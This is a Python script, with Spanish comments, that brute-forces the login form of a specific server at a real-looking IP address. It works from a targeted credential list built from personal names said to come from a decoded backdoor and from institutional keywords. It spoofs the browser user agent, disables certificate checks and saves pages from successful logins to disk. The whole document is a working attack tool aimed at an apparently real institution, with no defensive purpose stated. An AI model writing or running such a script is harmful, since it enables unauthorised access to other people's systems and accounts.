#!/usr/bin/env python3
import requests
import urllib3
urllib3.disable_warnings()

def smart_brute_force():
    target = "https://189.254.143.102/jsp/menu.jsp"
    
    # Credenciales BASADAS EN DECODIFICACIÓN EXITOSA + patrones comunes
    credentials = [
        # Del backdoor decodificado: "Jose Tono Garcia", "Equipo SITO"
        ("jose", "garcia"), ("tono", "garcia"), ("jose.tono", "garcia"),
        ("jgarcia", "tono"), ("garcia", "jose"), 
        ("equipo", "sito"), ("sito", "equipo"),
        ("admin", "sito"), ("sito", "admin"),
        
        # Combinaciones con información institucional
        ("jose", "utslp"), ("tono", "utslp"), ("garcia", "utslp"),
        ("jose", "ISCT"), ("tono", "ISCT"), ("garcia", "ISCT"),
        ("jose", "2010"), ("tono", "2010"), ("garcia", "2010"),
        
        # Posibles contraseñas basadas en el contexto
        ("jose", "Jose123"), ("tono", "Tono123"), ("garcia", "Garcia123"),
        ("jose", "Jose2024"), ("tono", "Tono2024"), ("garcia", "Garcia2024"),
        ("jose", "JlGarcia"), ("tono", "JTono"), ("garcia", "JGarcia"),
    ]
    
    print("=== FUERZA BRUTA INTELIGENTE MEJORADA ===")
    
    for username, password in credentials:
        try:
            # Datos de login más completos
            login_data = {
                'usuario': username,
                'contrasena': password,
                'xUsuario': username, 
                'xContrasena': password,
                'btnLogin': 'Login',
                'action': 'login'
            }
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:10.0) Gecko/20100101 Firefox/10.0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            session = requests.Session()
            r = session.post(
                target,
                data=login_data,
                headers=headers,
                verify=False,
                timeout=10,
                allow_redirects=True  # Seguir redirecciones para ver destino final
            )
            
            # Análisis detallado de la respuesta
            if r.status_code == 200:
                if "acceso_denegado" not in r.url and "acceso_denegado" not in r.text:
                    print(f"🚨 POSIBLE ÉXITO: {username}:{password}")
                    print(f"   URL final: {r.url}")
                    print(f"   Tamaño respuesta: {len(r.text)}")
                    
                    with open(f"possible_success_{username}_{password}.html", "w", encoding='utf-8') as f:
                        f.write(r.text)
                        
                    # Buscar indicadores de éxito en el contenido
                    if "bienvenido" in r.text.lower() or "welcome" in r.text.lower():
                        print(f"   ✅ CONTIENE 'BIENVENIDO' - ÉXITO CONFIRMADO!")
                    if "menu" in r.text.lower() and "principal" in r.text.lower():
                        print(f"   ✅ MENÚ PRINCIPAL DETECTADO!")
                        
                else:
                    print(f"❌ Denegado: {username}:{password}")
            else:
                print(f"⚠️  Status inusual {r.status_code}: {username}:{password}")
                
        except Exception as e:
            print(f"Error con {username}:{password} - {str(e)[:50]}")

if __name__ == "__main__":
    smart_brute_force()
